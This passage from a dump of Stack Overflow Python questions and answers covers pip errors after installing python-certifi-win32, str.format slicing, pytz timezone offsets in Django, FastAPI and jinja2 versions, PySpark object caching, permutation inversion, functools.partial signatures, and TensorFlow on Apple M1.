        Frame.__init__(self, root)
        self.checkbutton = Checkbutton(self)
        self.label = Label(self, text = text)
        self.label.grid(row = 0, column = 0)
        self.checkbutton.grid(row = 0, column = 1)
        self.label.bind('&lt;Button-1&gt;', lambda x : self.checkbutton.toggle())
        return
    
    pass

master = Tk()
lcb = LabeledCheckbutton(master, text = &quot;Here...&quot;)
lcb.grid(row = 0, sticky = W)

mainloop()
</code></pre>
<p>The output of the above code remains consistent with that of the first approach. The only difference is that it is now more easily scalable, as an object can be created whenever needed and the same lines of code need not be repeated every time.</p>
"
"72011315","1","PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: after installing python-certifi-win32","<p>I installed python-certifi-win32 package and after that, I am getting below error, when I import anything or pip install anything, the fail with the final error of PermissionError.</p>
<p>I tried rebooting the box. It didn't work. I am unable to uninstall the package as pip is erroring out too.</p>
<p>I am unable to figure out the exact reason why this error is happening. It doesn't seem to be code specific, seems related to the library I installed</p>
<pre><code>PS C:\Users\visha\PycharmProjects\master_test_runner&gt; pip install python-certifi-win32                                                                
Traceback (most recent call last):
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\importlib\_common.py&quot;, line 89, in _tempfile
    os.write(fd, reader())
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\importlib\abc.py&quot;, line 371, in read_bytes
    with self.open('rb') as strm:
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\importlib\_adapters.py&quot;, line 54, in open
    raise ValueError()
ValueError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\runpy.py&quot;, line 196, in _run_module_as_main
    return _run_code(code, main_globals, None,
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\runpy.py&quot;, line 86, in _run_code
    exec(code, run_globals)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\Scripts\pip.exe\__main__.py&quot;, line 4, in &lt;module&gt;
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\cli\main.py&quot;, line 9, in &lt;module&gt;
    from pip._internal.cli.autocompletion import autocomplete
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\cli\autocompletion.py&quot;, line 10, in &lt;module&gt;
    from pip._internal.cli.main_parser import create_main_parser
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\cli\main_parser.py&quot;, line 8, in &lt;module&gt;
    from pip._internal.cli import cmdoptions
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\cli\cmdoptions.py&quot;, line 23, in &lt;module&gt;
    from pip._internal.cli.parser import ConfigOptionParser
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\cli\parser.py&quot;, line 12, in &lt;module&gt;
    from pip._internal.configuration import Configuration, ConfigurationError
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\configuration.py&quot;, line 21, in &lt;module&gt;
    from pip._internal.exceptions import (
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_internal\exceptions.py&quot;, line 8, in &lt;module&gt;
    from pip._vendor.requests.models import Request, Response
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_vendor\requests\__init__.py&quot;, line 123, in &lt;module&gt;
    from . import utils
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\pip\_vendor\requests\utils.py&quot;, line 25, in &lt;module&gt;
    from . import certs
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1027, in _find_and_load
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1006, in _find_and_load_unlocked
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 688, in _load_unlocked
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\wrapt\importer.py&quot;, line 170, in exec_module
    notify_module_loaded(module)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\wrapt\decorators.py&quot;, line 470, in _synchronized
    return wrapped(*args, **kwargs)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\wrapt\importer.py&quot;, line 136, in notify_module_loaded
    hook(module)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\certifi_win32\wrapt_pip.py&quot;, line 35, in apply_patches
    import certifi
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1027, in _find_and_load
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1006, in _find_and_load_unlocked
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 688, in _load_unlocked
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\wrapt\importer.py&quot;, line 170, in exec_module
    notify_module_loaded(module)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\wrapt\decorators.py&quot;, line 470, in _synchronized
    return wrapped(*args, **kwargs)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\wrapt\importer.py&quot;, line 136, in notify_module_loaded
    hook(module)
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\certifi_win32\wrapt_certifi.py&quot;, line 20, in apply_patches
    certifi_win32.wincerts.CERTIFI_PEM = certifi.where()
  File &quot;C:\Users\visha\PycharmProjects\GUI_Automation\venv\lib\site-packages\certifi\core.py&quot;, line 37, in where
    _CACERT_PATH = str(_CACERT_CTX.__enter__())
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\contextlib.py&quot;, line 135, in __enter__
    return next(self.gen)
  File &quot;C:\Users\visha\AppData\Local\Programs\Python\Python310\lib\importlib\_common.py&quot;, line 95, in _tempfile
    os.remove(raw_path)
PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\Users\\visha\\AppData\\Local\\Temp\\tmpy_tb8siv'
PS C:\Users\visha\PycharmProjects\master_test_runner&gt; 
</code></pre>
","72087091","<p>I ran into the same issue today.  I corrected it by removing two *.pth files that were created when I had installed python-certifi-win32.  This prevents python-certifi-win32 from loading when python is run.</p>
<p>The files are listed below, and were located here:</p>
<pre><code>C:\Users\&lt;username&gt;\AppData\Local\Programs\Python\Python310\Lib\site-packages
</code></pre>
<p>Files:</p>
<pre><code>python-certifi-win32-init.pth
distutils-precedence.pth
</code></pre>
<p>Removing these files allowed me to install/uninstall other modules.</p>
"
"71787974","1","Why does `'{x[1:3]}'.format(x=""asd"")` cause a TypeError?","<p>Consider this:</p>
<pre><code>&gt;&gt;&gt; '{x[1]}'.format(x=&quot;asd&quot;)
's'
&gt;&gt;&gt; '{x[1:3]}'.format(x=&quot;asd&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: string indices must be integers
</code></pre>
<p>What could be the cause for this behavior?</p>
","71788626","<p>An experiment based on <a href=""https://stackoverflow.com/questions/71787974/why-does-x13-formatx-asd-cause-a-typeerror/71788247?noredirect=1#comment126863009_71788247"">your comment</a>, checking what value the object's <code>__getitem__</code> method actually receives:</p>
<pre><code>class C:
    def __getitem__(self, index):
        print(repr(index))

'{c[4]}'.format(c=C())
'{c[4:6]}'.format(c=C())
'{c[anything goes!@#$%^&amp;]}'.format(c=C())
C()[4:6]
</code></pre>
<p>Output (<a href=""https://tio.run/##K6gsycjPM7YoKPr/PzknsbhYwdmKSwEIUlLTFOLj01NLMktSc@PjNYpTc9J0FDLzUlIrNCEqQKCgKDOvRKMotaBIAyKlycWlXp0cbRJbq66Xll@Um1iikWzrrAEUBwtbmWGXSMwDuiMzL10hPT@1WNFBWUU1Tg1TJZAAG/H/PwA"" rel=""noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>):</p>
<pre><code>4
'4:6'
'anything goes!@#$%^&amp;'
slice(4, 6, None)
</code></pre>
<p>So while the <code>4</code> gets converted to an <code>int</code>, the <code>4:6</code> isn't converted to <code>slice(4, 6, None)</code> as in usual slicing. Instead, it remains simply the <em>string</em> <code>'4:6'</code>. And that's not a valid type for indexing/slicing a string, hence the <code>TypeError: string indices must be integers</code> you got.</p>
<p><strong>Update:</strong></p>
<p>Is that documented? Well... I don't see something really clear, but @GACy20 <a href=""https://stackoverflow.com/questions/71787974/why-does-x13-formatx-asd-cause-a-typeerror/71788247?noredirect=1#comment126874652_71788247"">pointed out</a> something subtle. The <a href=""https://docs.python.org/3/library/string.html#format-string-syntax"" rel=""noreferrer"">grammar</a> has these rules</p>
<pre class=""lang-none prettyprint-override""><code>field_name        ::=  arg_name (&quot;.&quot; attribute_name | &quot;[&quot; element_index &quot;]&quot;)*
element_index     ::=  digit+ | index_string
index_string      ::=  &lt;any source character except &quot;]&quot;&gt; +
</code></pre>
<p>Our <code>c[4:6]</code> is the <code>field_name</code>, and we're interested in the <code>element_index</code> part <code>4:6</code>. I think it would be clearer if <code>digit+</code> had its own rule with meaningful name:</p>
<pre class=""lang-none prettyprint-override""><code>field_name        ::=  arg_name (&quot;.&quot; attribute_name | &quot;[&quot; element_index &quot;]&quot;)*
element_index     ::=  index_integer | index_string
index_integer     ::=  digit+
index_string      ::=  &lt;any source character except &quot;]&quot;&gt; +
</code></pre>
<p>I'd say having <code>index_integer</code> and index_string would more clearly indicate that <code>digit+</code> is converted to an <em>integer</em> (instead of staying a digit string), while <code>&lt;any source character except &quot;]&quot;&gt; +</code> would stay a <em>string</em>.</p>
<p>That said, looking at the rules as they are, perhaps we should think <em>&quot;what would be the point of separating the digits case out of the any-characters case which would match it as well?&quot;</em> and think that the point is to treat pure digits differently, presumably to convert them to an integer. Or maybe some other part of the documentation even states that <code>digit</code> or <code>digits+</code> <em>in general</em> gets converted to an integer.</p>
"
"71768804","1","Two ways to create timezone aware datetime objects (Django). Seven minutes difference?","<p>Up to now I thought both ways to create a timezone aware datetime are equal.</p>
<p>But they are not:</p>
<pre><code>import datetime

from django.utils.timezone import make_aware, get_current_timezone

make_aware(datetime.datetime(1999, 1, 1, 0, 0, 0), get_current_timezone())

datetime.datetime(1999, 1, 1, 0, 0, 0, tzinfo=get_current_timezone())
</code></pre>
<pre><code>datetime.datetime(1999, 1, 1, 0, 0, tzinfo=&lt;DstTzInfo 'Europe/Berlin' CET+1:00:00 STD&gt;)

datetime.datetime(1999, 1, 1, 0, 0, tzinfo=&lt;DstTzInfo 'Europe/Berlin' LMT+0:53:00 STD&gt;)
</code></pre>
<p>In the Django Admin GUI second way creates this (German date format dd.mm.YYYY):</p>
<pre><code>01.01.1999 00:07:00
</code></pre>
<p>Why are there 7 minutes difference if I use this:</p>
<pre><code>datetime.datetime(1999, 1, 1, 0, 0, 0, tzinfo=get_current_timezone())
</code></pre>
","71823301","<p>This happens on Django 3.2 and lower, which rely on the <a href=""http://pytz.sourceforge.net/"" rel=""noreferrer"">pytz</a> library. In Django 4 (unless you enable to setting to use the deprecated library), the output of the two examples you give is identical.</p>
<p>In Django 3.2 and below, the variance arises because the localised time is built in two different ways. When using <code>make_aware</code>, it is done by <a href=""https://github.com/django/django/blob/main/django/utils/timezone.py#L286"" rel=""noreferrer"">calling the <code>localize()</code></a> method on the <code>pytz</code> timezone instance. In the second version, it's done by passing a <code>tzinfo</code> object directly to the <code>datetime</code> constructor.</p>
<p>The difference between the two is well illustrated in <a href=""https://blog.ganssle.io/articles/2018/03/pytz-fastest-footgun.html"" rel=""noreferrer"">this blog post</a>:</p>
<blockquote>
<p>The biggest mistake people make with pytz is simply attaching its time zones to the constructor, since that is the standard way to add a time zone to a datetime in Python. If you try and do that, the best case scenario is that you'll get something obviously absurd:</p>
<pre><code>import pytz
from datetime import datetime

NYC = pytz.timezone('America/New_York')
dt = datetime(2018, 2, 14, 12, tzinfo=NYC)
print(dt)
# 2018-02-14 12:00:00-04:56
</code></pre>
<p>Why is the time offset -04:56 and not -05:00? Because that was the local solar mean time in New York before standardized time zones were adopted, and is thus the first entry in the <code>America/New_York</code> time zone. Why did pytz return that? Because unlike the standard library's model of lazily-computed time zone information, pytz takes an eager calculation approach.</p>
<p>Whenever you construct an aware datetime from a naive one, you need to call the localize function on it:</p>
<pre><code>dt = NYC.localize(datetime(2018, 2, 14, 12))
print(dt)
# 2018-02-14 12:00:00-05:00
</code></pre>
</blockquote>
<p>Exactly the same thing is happening with your <code>Europe/Berlin</code> example. <code>pytz</code> is eagerly fetching the first entry in its database, which is a pre-1983 solar time, which was <a href=""https://www.timeanddate.com/time/zone/germany#time"" rel=""noreferrer"">53 minutes and 28 seconds ahead</a> of Greenwich Mean Time (GMT). This is obviously inappropriate given the date - but the <code>tzinfo</code> isn't aware of the date you are using unless you pass it to <code>localize()</code>.</p>
<p>This is the difference between your two approaches. Using <code>make_aware</code> correctly calls <code>localize()</code> on the object. Assigning the <code>tzinfo</code> directly to the <code>datetime</code> object, however, doesn't, and results in <code>pytz</code> using the (wrong) time zone information because it was simply the first entry for that zone in its database.</p>
<p>The pytz documentation <a href=""http://pytz.sourceforge.net/#localized-times-and-date-arithmetic"" rel=""noreferrer"">obliquely refers</a> to this as well:</p>
<blockquote>
<p>This library only supports two ways of building a localized time. The first is to use the localize() method provided by the pytz library. This is used to localize a naive datetime (datetime with no timezone information)... The second way of building a localized time is by converting an existing localized time using the standard astimezone() method... Unfortunately using the tzinfo argument of the standard datetime constructors ‘’does not work’’ with pytz for many timezones.</p>
</blockquote>
<p>It is actually because of these and several other bugs in the <code>pytz</code> implementation that Django <a href=""https://groups.google.com/g/django-developers/c/PtIyadoC-fI"" rel=""noreferrer"">dropped it in favour of Python's built-in <code>zoneinfo</code> module</a>.</p>
<p>More from that blog post:</p>
<blockquote>
<p>At the time of its creation, <code>pytz</code> was cleverly designed to optimize for performance and correctness, but with the changes introduced by PEP 495 and the performance improvements to dateutil, the reasons to use it are dwindling.
... The biggest reason to use dateutil over pytz is the fact that dateutil uses the standard interface and pytz doesn't, and as a result it is <em>very easy</em> to use pytz incorrectly.</p>
</blockquote>
<p>Passing a <code>pytz</code> <code>tzinfo</code> object directly to a <code>datetime</code> constructor is incorrect. You must call <code>localize()</code> on the <code>tzinfo</code> class, passing it the date. The correct way to initialise the datetime in your second example is:</p>
<pre><code>&gt; berlin = get_current_timezone()
&gt; berlin.localize(datetime.datetime(1999, 1, 1, 0, 0, 0))
datetime.datetime(1999, 1, 1, 0, 0, tzinfo=&lt;DstTzInfo 'Europe/Berlin' CET+1:00:00 STD&gt;)
</code></pre>
<p>... which matches what <code>make_aware</code> produces.</p>
"
"71194918","1","when i use docker-compose to install a fastapi project, i got AssertionError:","<p>when I use docker-compose to install a fastapi project, I got <code>AssertionError: jinja2 must be installed to use Jinja2Templates</code></p>
<p>but when I use env to install it, that will be run well.</p>
<p>my OS:</p>
<p>Ubuntu18.04STL</p>
<p>my requirements.txt:</p>
<pre><code>fastapi~=0.68.2
starlette==0.14.2
pydantic~=1.8.1

uvicorn~=0.12.3
SQLAlchemy~=1.4.23

# WSGI
Werkzeug==1.0.1

pyjwt~=1.7.0

# async-exit-stack~=1.0.1
# async-generator~=1.10

jinja2~=2.11.2

# assert aiofiles is not None, &quot;'aiofiles' must be installed to use FileResponse&quot;
aiofiles~=0.6.0
python-multipart~=0.0.5

requests~=2.25.0
pyyaml~=5.3.1
# html-builder==0.0.6
loguru~=0.5.3
apscheduler==3.7.0

pytest~=6.1.2
html2text==2020.1.16
mkdocs==1.2.1

</code></pre>
<p>Dockerfile</p>
<pre><code>FROM python:3.8
ENV PYTHONDONTWRITEBYTECODE 1
ENV PYTHONUNBUFFERED 1

WORKDIR /server
COPY requirements.txt /server/
RUN pip install -r requirements.txt
COPY . /server/
</code></pre>
<p>docker-compose.yml</p>
<pre><code>version: '3.7'

services:
  figbox_api:
    build:
        context: .
        dockerfile: Dockerfile
    command:  uvicorn app.main:app --port 8773 --host 0.0.0.0 --reload
    volumes:
    - .:/server
    ports:
    - 8773:8773
</code></pre>
<p>Do I need to provide some other information?</p>
<p>Thanks</p>
","72120645","<p>I had a same problem on heroku, the error comes from Jinja2
version 2.11.x and it run locally but not in Heroku.</p>
<p>Just install latest version of jinja2 it will work fine in your case too.</p>
<pre><code>pip install Jinja2==3.1.2
or 
pip install Jinja2 --upgrade
</code></pre>
"
"72106357","1","access objects in pyspark user-defined function from outer scope, avoid PicklingError: Could not serialize object","<p>How do I avoid initializing a class within a <code>pyspark</code> user-defined function?  Here is an example.</p>
<p>Creating a <code>spark</code> session and DataFrame representing four latitudes and longitudes.</p>
<pre><code>import pandas as pd
from pyspark import SparkConf
from pyspark.sql import SparkSession

conf = SparkConf()
conf.set('spark.sql.execution.arrow.pyspark.enabled', 'true')
spark = SparkSession.builder.config(conf=conf).getOrCreate()

sdf = spark.createDataFrame(pd.DataFrame({
    'lat': [37, 42, 35, -22],
    'lng': [-113, -107, 127, 34]}))
</code></pre>
<p>Here is the Spark DataFrame</p>
<pre><code>+---+----+
|lat| lng|
+---+----+
| 37|-113|
| 42|-107|
| 35| 127|
|-22|  34|
+---+----+
</code></pre>
<p>Enriching the DataFrame with a timezone string at each latitude / longitude via the <code>timezonefinder</code> package.  <strong>Code below runs without errors</strong></p>
<pre><code>from typing import Iterator
from timezonefinder import TimezoneFinder

def func(iterator: Iterator[pd.DataFrame]) -&gt; Iterator[pd.DataFrame]:
    for dx in iterator:
        tzf = TimezoneFinder()
        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]
        yield dx
pdf = sdf.mapInPandas(func, schema='lat double, lng double, timezone string').toPandas()
</code></pre>
<p>The above code runs without errors and creates the pandas DataFrame below.  The issue is the <code>TimezoneFinder</code> class is initialized within the user-defined function which creates a bottleneck</p>
<pre><code>In [4]: pdf
Out[4]:
    lat    lng         timezone
0  37.0 -113.0  America/Phoenix
1  42.0 -107.0   America/Denver
2  35.0  127.0       Asia/Seoul
3 -22.0   34.0    Africa/Maputo
</code></pre>
<p>The question is how to get this code to run more like below, where the <code>TimezoneFinder</code> class is initialized once and outside of the user-defined function.  As is, the code below generates this error <code>PicklingError: Could not serialize object: TypeError: cannot pickle '_io.BufferedReader' object</code></p>
<pre><code>def func(iterator: Iterator[pd.DataFrame]) -&gt; Iterator[pd.DataFrame]:
    for dx in iterator:
        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]
        yield dx
tzf = TimezoneFinder()
pdf = sdf.mapInPandas(func, schema='lat double, lng double, timezone string').toPandas()
</code></pre>
<p>UPDATE - Also tried to use <code>functools.partial</code> and an outer function but still received same error.  That is, this approach does not work:</p>
<pre><code>def outer(iterator, tzf):
    def func(iterator: Iterator[pd.DataFrame]) -&gt; Iterator[pd.DataFrame]:
        for dx in iterator:
            dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]
            yield dx
    return func(iterator)
tzf = TimezoneFinder()
outer = partial(outer, tzf=tzf)
pdf = sdf.mapInPandas(outer, schema='lat double, lng double, timezone string').toPandas()
</code></pre>
","72143511","<p>You will need a cached instance of the object on every worker.
You could do that as follows</p>
<pre><code>instance = [None]

def func(iterator: Iterator[pd.DataFrame]) -&gt; Iterator[pd.DataFrame]:
    if instance[0] is None:
        instance[0] = TimezoneFinder()
    tzf = instance[0]
    for dx in iterator:
        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]
        yield dx
</code></pre>
<p>Note that for this to work, your function would be defined within a module, to give the instance cache somewhere to live. Else you would have to hang it off some builtin module, e.g., <code>os.instance = []</code>.</p>
"
"71564200","1","Python how to revert the pattern of a list rearrangement","<p>So I am rearranging a list based on an index pattern and would like to find a way to calculate the pattern I need to revert the list back to its original order.</p>
<p>for my example I am using a list of 5 items as I can work out the pattern needed to revert the list back to its original state.</p>
<p>However this isn't so easy when dealing with 100's of list items.</p>
<pre><code>def rearrange(pattern: list, L: list):
    new_list = []
    for i in pattern:
        new_list.append(L[i-1])
    return new_list

print(rearrange([2,5,1,3,4], ['q','t','g','x','r']))

#['t', 'r', 'q', 'g', 'x']
</code></pre>
<p>and in order to set it back to the original pattern
I would use</p>
<pre><code>print(rearrange([3,1,4,5,2],['t', 'r', 'q', 'g', 'x']))
#['q', 't', 'g', 'x', 'r']
</code></pre>
<p>What I am looking for is a way to calculate the pattern &quot;[3,1,4,5,2]&quot;
regarding the above example.
whist running the script so that I can set the list back to its original order.</p>
<p>Using a larger example:</p>
<pre><code>print(rearrange([18,20,10,11,13,1,9,12,16,6,15,5,3,7,17,2,19,8,14,4],['e','p','b','i','s','r','q','h','m','f','c','g','d','k','l','t','a','n','j','o']))
#['n', 'o', 'f', 'c', 'd', 'e', 'm', 'g', 't', 'r', 'l', 's', 'b', 'q', 'a', 'p', 'j', 'h', 'k', 'i']
</code></pre>
<p>but I need to know the pattern to use with this new list in order to return it to its original state.</p>
<pre><code>print(rearrange([???],['n', 'o', 'f', 'c', 'd', 'e', 'm', 'g', 't', 'r', 'l', 's', 'b', 'q', 'a', 'p', 'j', 'h', 'k', 'i']))
#['e','p','b','i','s','r','q','h','m','f','c','g','d','k','l','t','a','n','j','o']
</code></pre>
","71564272","<p>This is commonly called &quot;argsort&quot;. But since you're using 1-based indexing, you're off-by-one. You can get it with numpy:</p>
<pre><code>&gt;&gt;&gt; pattern
[2, 5, 1, 3, 4]
&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; np.argsort(pattern) + 1
array([3, 1, 4, 5, 2])
</code></pre>
<p>Without numpy:</p>
<pre><code>&gt;&gt;&gt; [1 + i for i in sorted(range(len(pattern)), key=pattern.__getitem__)]
[3, 1, 4, 5, 2]
</code></pre>
"
"71402387","1","The rationale of `functools.partial` behavior","<p>I'm wondering what the story -- whether sound design or inherited legacy -- is behind these <code>functools.partial</code> and <code>inspect.signature</code> facts (talking python 3.8 here).</p>
<p>Set up:</p>
<pre class=""lang-py prettyprint-override""><code>from functools import partial
from inspect import signature

def bar(a, b):
    return a / b
</code></pre>
<p>All starts well with the following, which seems compliant with curry-standards.
We're fixing <code>a</code> to <code>3</code> positionally, <code>a</code> disappears from the signature and it's value is indeed bound to <code>3</code>:</p>
<pre><code>f = partial(bar, 3)
assert str(signature(f)) == '(b)'
assert f(6) == 0.5 == f(b=6)
</code></pre>
<p>If we try to specify an alternate value for <code>a</code>, <code>f</code> won't tell us that we got an unexpected keyword, but rather that it got multiple values for argument <code>a</code>:</p>
<pre class=""lang-py prettyprint-override""><code>f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'
f(c=2, b=6)  # TypeError: bar() got an unexpected keyword argument 'c'
</code></pre>
<p>But now if we fix <code>b=3</code> through a keyword, <code>b</code> is <strong>not</strong> removed from the signature, it's kind changes to keyword-only, and we can still use it (overwrite the default, as a normal default, which we couldn't do with <code>a</code> in the previous case):</p>
<pre class=""lang-py prettyprint-override""><code>f = partial(bar, b=3)
assert str(signature(f)) == '(a, *, b=3)'
assert f(6) == 2.0 == f(6, b=3)
assert f(6, b=1) == 6.0
</code></pre>
<p>Why such asymmetry?</p>
<p>It gets even stranger, we can do this:</p>
<pre class=""lang-py prettyprint-override""><code>f = partial(bar, a=3)
assert str(signature(f)) == '(*, a=3, b)'  # whaaa?! non-default argument follows default argument?
</code></pre>
<p>Fine: For keyword-only arguments, there can be no confusing of what parameter a default is assigned to, but I still wonder what design-thinking or constraints are behind these choices.</p>
","71403608","<h1>Using <code>partial</code> with a Positional Argument</h1>
<pre><code>f = partial(bar, 3)
</code></pre>
<p>By design, upon calling a function, positional arguments are assigned first. Then logically, <code>3</code> should be assigned to <code>a</code> with <code>partial</code>. It makes sense to remove it from the signature as there is <em>no way</em> to assign anything to it again!</p>
<p>when you have <code>f(a=2, b=6)</code>, you are actually doing</p>
<pre><code>bar(3, a=2, b=6)
</code></pre>
<p>when you have <code>f(2, 2)</code>, you are actually doing</p>
<pre><code>bar (3, 2, 2)
</code></pre>
<p>We never get rid of <code>3</code></p>
<p>For the new partial function:</p>
<ol>
<li>We can't give <code>a</code> a different value with another positional argument</li>
<li>We can't use the keyword <code>a</code> to assign a different value to it as it is already &quot;filled&quot;</li>
</ol>
<blockquote>
<p>If there is a parameter with the same name as the keyword, then the argument value is assigned to that parameter slot. However, if the parameter slot is already filled, then that is an error.</p>
</blockquote>
<p>I recommend reading the <a href=""https://www.python.org/dev/peps/pep-3102/#function-calling-behavior"" rel=""nofollow noreferrer"">function calling behavior</a> section of <a href=""https://www.python.org/dev/peps/pep-3102/"" rel=""nofollow noreferrer"">pep-3102</a> to get a better grasp of this matter.</p>
<h1>Using <code>partial</code> with a Keyword Argument</h1>
<pre><code>f = partial(bar, b=3)
</code></pre>
<p>This is a different use case. We are applying a keyword argument to <code>bar</code>.</p>
<p>You are functionally turning</p>
<pre><code>def bar(a, b):
    ...
</code></pre>
<p>into</p>
<pre><code>def f(a, *, b=3):
    ...
</code></pre>
<p>where <code>b</code> becomes a keyword-only argument
instead of</p>
<pre><code>def f(a, b=3):
    ...
</code></pre>
<p><code>inspect.signature</code> correctly reflects a design decision of <code>partial</code>. The keyword arguments passed to <code>partial</code> are designed to append additional positional arguments (<a href=""https://docs.python.org/3/library/functools.html#functools.partial"" rel=""nofollow noreferrer"">source</a>).</p>
<p>Note that this behavior <em>does not</em> necessarily override the keyword arguments supplied with <code>f = partial(bar, b=3)</code>, i.e., <code>b=3</code> will be applied regardless of whether you supply the second positional argument or not (and there will be a <code>TypeError</code> if you do so). This is different from a positional argument with a default value.</p>
<pre><code>&gt;&gt;&gt; f(1, 2)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: f() takes 1 positional argument but 2 were given
</code></pre>
<p>where <code>f(1, 2)</code> is equivalent to <code>bar(1, 2, b=3)</code></p>
<p>The only way to override it is with a keyword argument</p>
<pre><code>&gt;&gt;&gt; f(2, b=2)
</code></pre>
<p>An argument that can only be assigned with a keyword but positionally? This is a keyword-only argument. Thus <code>(a, *, b=3)</code> instead of <code>(a, b=3)</code>.</p>
<h1>The Rationale of Non-default Argument follows Default Argument</h1>
<pre><code>f = partial(bar, a=3)
assert str(signature(f)) == '(*, a=3, b)'  # whaaa?! non-default argument follows default argument?
</code></pre>
<ol>
<li>You can't do <code>def bar(a=3, b)</code>. <code>a</code> and <code>b</code> are so called <code>positional-or-keyword arguments</code>.</li>
<li>You can do <code>def bar(*, a=3, b)</code>. <code>a</code> and <code>b</code> are <code>keyword-only arguments</code>.</li>
</ol>
<p>Even though semantically, <code>a</code> has a default value and thus it is <strong>optional</strong>, we can't leave it unassigned because <code>b</code>, which is a <code>positional-or-keyword argument</code> needs to be assigned a value if we want to use <code>b</code> positionally. If we do not supply a value for <code>a</code>, we have to use <code>b</code> as a <code>keyword argument</code>.</p>
<p>Checkmate! There is no way for <code>b</code> to be a <code>positional-or-keyword argument</code> as we intended.</p>
<p>The PEP for <a href=""https://www.python.org/dev/peps/pep-0570/#syntax-and-semantics"" rel=""nofollow noreferrer"">positonal-only arguments</a> also kind of shows the rationale behind it.</p>
<p>This also has something to do with the aforementioned &quot;function calling behavior&quot;.</p>
<h1><code>partial</code> != Currying &amp; Implementation Details</h1>
<p><code>partial</code> by its implementation wraps the original function while storing the fixed arguments you passed to it.</p>
<p><em><strong>IT IS NOT IMPLEMENTED WITH CURRYING</strong></em>. It is rather <strong>partial application</strong> instead of currying in the sense of functional programming. <code>partial</code> is essentially applying the fixed arguments first, then the arguments you called with the wrapper:</p>
<pre><code>def __call__(self, /, *args, **keywords):
    keywords = {**self.keywords, **keywords}
    return self.func(*self.args, *args, **keywords)
</code></pre>
<p>This explains <code>f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'</code>.</p>
<p>See also: <a href=""https://www.python.org/dev/peps/pep-0309/#feedback-from-comp-lang-python-and-python-dev"" rel=""nofollow noreferrer"">Why is <code>partial</code> called <code>partial</code> instead of <code>curry</code></a></p>
<h1>Under the Hood of <code>inspect</code></h1>
<p>The outputs of inspect is another story.</p>
<p><code>inspect</code> itself is a tool that produces user-friendly outputs. For <code>partial()</code> in particular (and <code>partialmethod()</code>, similarly), it follows the wrapped function while taking the fixed parameters into account:</p>
<pre><code>if isinstance(obj, functools.partial):
    wrapped_sig = _get_signature_of(obj.func)
    return _signature_get_partial(wrapped_sig, obj)
</code></pre>
<p>Do note that it is not <code>inspect.signature</code>'s goal to show you the actual signature of the wrapped function in the AST.</p>
<pre><code>def _signature_get_partial(wrapped_sig, partial, extra_args=()):
    &quot;&quot;&quot;Private helper to calculate how 'wrapped_sig' signature will
    look like after applying a 'functools.partial' object (or alike)
    on it.
    &quot;&quot;&quot;
    ...
</code></pre>
<p>So we have a nice and ideal signature for <code>f = partial(bar, 3)</code>
but get <code>f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'</code> in reality.</p>
<h1>Follow-up</h1>
<p>If you want currying so badly, how do you implement it in Python, in the way which gives you the expected <code>TypeError</code>?</p>
"
"71688065","1","Generic requirements.txt for TensorFlow on both Apple M1 and other devices","<p>I have a new MacBook with the Apple M1 chipset. To install tensorflow, I follow the instructions <a href=""https://developer.apple.com/metal/tensorflow-plugin/"" rel=""noreferrer"">here</a>, i.e., installing <code>tensorflow-metal</code> and <code>tensorflow-macos</code> instead of the normal <code>tensorflow</code> package.</p>
